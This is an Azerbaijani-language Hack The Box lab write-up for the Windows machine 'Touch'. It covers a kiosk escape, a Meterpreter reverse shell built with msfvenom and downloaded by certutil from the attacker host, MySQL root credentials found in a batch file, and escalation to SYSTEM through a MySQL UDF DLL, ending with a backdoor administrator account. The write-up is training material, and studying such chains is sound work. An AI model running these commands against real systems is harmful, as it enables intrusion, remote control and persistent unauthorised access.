# Touch (HTB)

> Platforma: Hack The Box  
> Mövsüm: 12 / Aero  
> OS: Windows 11 24H2+ (Build 26100)  
> Çətinlik: Asan  
> Nəticə: nt authority\system

---

## Hücum Zənciri

```text
Reconnaissance
├── nmap -sV -sC 10.129.71.63 → 135 (RPC), 3389 (RDP), 5985 (WinRM), 8443 (Nexion DeviceHub)
├── ffuf /FUZZ → /login (200), /api (403)
└── ffuf /api/FUZZ → /api/status → serial <SERIAL>

Foothold (DeviceHub → RDP)
├── /login → password = serial (<SERIAL>)
├── Found credentials: KioskUser / <PASSWORD>
├── xfreerdp /u:KioskUser /p:'<PASSWORD>' /v:10.129.71.63
└── Kiosk HTB Airways

Kiosk Escape
├── Booking Ref: KS7X2M / Last Name: CRAWFORD
├── DOCUMENT VERIFICATION → Scan → error
├── DeviceHub → turn off the scanner
├── Scan → new error with a clickable link
├── Click → browser outside the kiosk
├── Ctrl+O → C:\Windows\System32\cmd.exe
└── shell: kiosk-042\kioskuser → type user.txt → <USER_FLAG>

Shell Upgrade (Meterpreter)
├── msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.82 LPORT=4445 -f exe -o shell.exe
├── python3 -m http.server 8000
├── msfconsole → multi/handler
├── certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
└── shell.exe → Meterpreter session

Privilege Check
├── getuid → KIOSK-042\KioskUser
├── sysinfo → Windows 11 24H2+ (Build 26100)
├── whoami /priv → no SeImpersonatePrivilege
└── whoami /groups → Printer Administrators, RDP Users, Users

Enumeration (Source Code)
├── C:\Program Files\HTB Airways\Kiosk\ (Node/Express/React)
├── C:\Program Files\Nexion Systems\DocReader\ (.NET DeviceHub)
├── C:\Program Files\Nexion Systems\Printer\
├── C:\MySQL\ (MySQL Server 8.0)
├── document-service.ts → OCR MRZ (tesseract.js)
├── staff.ts → QR HTBAW-STAFF:<email>:<authCode>
├── database/index.ts → kiosk_app:<PASSWORD>
└── MySQL → SELECT * FROM _htb_staff

Credential Leak (MySQL root)
├── C:\ProgramData\HTB Airways\db-config.ini
├── C:\ProgramData\HTB Airways\refresh-dates.bat
│   └── -u root -p<PASSWORD>
├── SELECT user, host, Grant_priv, File_priv FROM mysql.user → root:Y:Y
└── icacls C:\MySQL\lib\plugin → Authenticated Users:(M)

Privilege Escalation (MySQL UDF Hijacking)
├── meterpreter upload lib_mysqludf_sys_64.dll → C:\MySQL\lib\plugin\
├── CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll'
├── SELECT sys_eval('whoami') → nt authority\system
├── SELECT sys_eval('type C:\Users\Administrator\Desktop\root.txt') → <ROOT_FLAG>
└── Optional: net user hacker /add → Administrators → RDP/WinRM
```

> Qeyd: Bütün flaglar, parollar və heşlər etik səbəblərə görə maskalanmışdır.

---

## Maşın Brifinqi

Əvvəlki maşının - **Layover**-in təsvirində aşağıdakı ad və bron kodu tapıldı:

```
Jenny Crawford / KS7X2M
```

---

## Kəşfiyyat

```bash
nmap -sV -sC 10.129.71.63
```

| Port | Xidmət                                    |
|------|-------------------------------------------|
| 135  | Microsoft Windows RPC                     |
| 3389 | Microsoft Terminal Service (RDP)          |
| 5985 | Microsoft HTTPAPI httpd 2.0 (WinRM)       |
| 8443 | Microsoft HTTPAPI httpd 2.0 - Nexion DeviceHub |

Port 8443 - **Nexion DeviceHub - Login**.

---

## Veb Kəşfiyyat

```bash
ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
# /login (200), /api (403)

ffuf -u http://10.129.71.63:8443/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
# /api/status
```

`/api/status` qaytarır:

```json
{"serial":"<SERIAL>","status":"online", ...}
```

---

## Foothold (DeviceHub → RDP)

`/login`-da ipucu: *"default device password is its own serial number"*.

Parol:

```
<SERIAL>
```

DeviceHub panelində:

```
KioskUser / <PASSWORD>
```

### RDP

```bash
xfreerdp /u:KioskUser /p:'<PASSWORD>' /v:10.129.71.63 /clipboard /dynamic-resolution
```

Tam ekran HTB Airways kiosku.

---

## Kiosk Qaçışı

### Bronun daxil edilməsi

```
Booking Ref: KS7X2M
Last Name: CRAWFORD
```

DOCUMENT VERIFICATION ekranı → **Scan** → xəta.

### Avadanlığın manipulyasiyası

DeviceHub → skaneri söndür → yenidən axtar → Scan → **kliklənə bilən link** ilə başqa xəta.

### Qaçış

Linkə klik kiosk xaricində tam brauzer açır.

**Ctrl+O** → `C:\Windows\System32\cmd.exe`.

Shell:

```
kiosk-042\kioskuser
```

### İstifadəçi Bayrağı

```cmd
type C:\Users\KioskUser\Desktop\user.txt
```

```
<USER_FLAG>
```

---

## Shell Yenilənməsi (Meterpreter)

```bash
ip a
mkdir -p /tmp/share && cd /tmp/share
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.82 LPORT=4445 -f exe -o /tmp/share/shell.exe
python3 -m http.server 8000
```

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.82; set LPORT 4445; exploit"
```

Yükləmə və işə salma:

```cmd
certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
C:\Users\KioskUser\Desktop\shell.exe
```

```
[*] Meterpreter session 1 opened (10.10.14.82:4445 -> 10.129.76.83:xxxxx)
```

---

## İmtiyazların Yoxlanılması

```
meterpreter > getuid
Server username: KIOSK-042\KioskUser

meterpreter > sysinfo
Computer : KIOSK-042
OS       : Windows 11 24H2+ (10.0 Build 26100)
Arch     : x64
```

```cmd
whoami /priv
whoami /groups
```

**İmtiyazlar:** `SeChangeNotifyPrivilege`, `SeUndockPrivilege`, `SeIncreaseWorkingSetPrivilege`, `SeTimeZonePrivilege`.

**Qruplar:** `KIOSK-042\Printer Administrators`, `BUILTIN\Remote Desktop Users`, `BUILTIN\Users`.

**`SeImpersonatePrivilege` yoxdur** - JuicyPotato/PrintSpoofer/GodPotato uyğun deyil.

---

## Enumeration (Mənbə Kodu)

```cmd
dir "C:\Program Files\HTB Airways\Kiosk\"
dir "C:\Program Files\Nexion Systems\DocReader\"
dir "C:\Program Files\Nexion Systems\Printer\"
dir C:\MySQL\
```

| Yol | Təsvir |
|-----|--------|
| `C:\Program Files\HTB Airways\Kiosk\` | Node/Express/React kiosk tətbiqi |
| `C:\Program Files\Nexion Systems\DocReader\` | .NET DeviceHub backend (port 8443) |
| `C:\Program Files\Nexion Systems\Printer\` | .NET printer xidməti |
| `C:\MySQL\` | MySQL Server 8.0 |

```cmd
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\services\document-service.ts"
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\routes\staff.ts"
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
```

Əsas məqamlar:

- `document-service.ts` - tesseract.js vasitəsilə OCR MRZ.
- `staff.ts` - QR `HTBAW-STAFF:<email>:<authCode>`-u deşifrə edir, `_htb_staff`-də yoxlayır.

**`database/index.ts`-dən MySQL giriş məlumatları:**

```
host: 127.0.0.1
port: 3306
user: kiosk_app
password: <PASSWORD>
database: htb_airways
```

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p<PASSWORD> -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
```

---

## MySQL root parolunun axtarışı

```cmd
type "C:\ProgramData\HTB Airways\db-config.ini"
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
type "C:\ProgramData\HTB Airways\refresh-dates.sql"
```

`refresh-dates.bat`:

```bat
C:\MySQL\bin\mysql.exe -u root -p<PASSWORD> < "C:\ProgramData\HTB Airways\refresh-dates.sql"
```

---

## Root imtiyazlarının yoxlanılması

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
```

```
root  localhost  Y  Y
```

`File_priv = Y` → UDF hijacking mümkündür.

```powershell
icacls "C:\MySQL\lib\plugin"
```

```
NT AUTHORITY\Authenticated Users:(I)(M)
```

`M` - `KioskUser` plagin qovluğuna yaza bilər.

---

## Privilege Escalation (MySQL UDF Hijacking)

DLL-in yüklənməsi:

```
meterpreter > upload /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"
```

Və ya certutil vasitəsilə:

```powershell
certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

Funksiyanın yaradılması:

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
```

Yoxlama:

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('whoami');"
# nt authority\system
```

**Mexanika:** MySQL Windows xidməti kimi `NT AUTHORITY\SYSTEM` altında işləyir. Yüklənmiş DLL-dən `sys_eval` UDF SQL sorğuları vasitəsilə həmin imtiyazlarla shell əmrlərini icra edir.

---

## Root Bayrağı

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
```

```
<ROOT_FLAG>
```

### İstəyə bağlı - interaktiv SYSTEM

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('net user hacker P@ssw0rd123! /add');"
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('net localgroup Administrators hacker /add');"
```

Sonra - `hacker` kimi RDP/WinRM.

---

## Bayraqlar

| Bayraq | Dəyər                            |
|--------|----------------------------------|
| User   | <USER_FLAG> |
| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **Avtorizasiya olmadan `/api/status` vasitəsilə seriya nömrəsinin sızması** - DeviceHub parolu.
- **Avadanlıq vəziyyətini manipulyasiya edərək kioskdan qaçış** - admin panelində skaneri söndürmək → kliklənə bilən link ilə yeni xəta.
- **Universal qaçış yolu kimi Ctrl+O** - Open File dialoqu Explorer-ə çıxış verir və `cmd.exe`-i işə salmağa imkan verir.
- **.bat/.sql-də açıq mətnli parollar** - `refresh-dates.bat` MySQL root parolunu ehtiva edir.
- **MySQL File_priv + yazıla bilən plagin qovluğu = RCE** - UDF hijacking.
- **MySQL Windows xidməti kimi SYSTEM altında işləyir** - DBMS-in UDF ilə kompromisi birbaşa SYSTEM verir.
- **SeImpersonatePrivilege-in olmaması çıxılmaz yol deyil** - lokal xidmətlər vasitəsilə alternativ vektorlar axtarırıq.
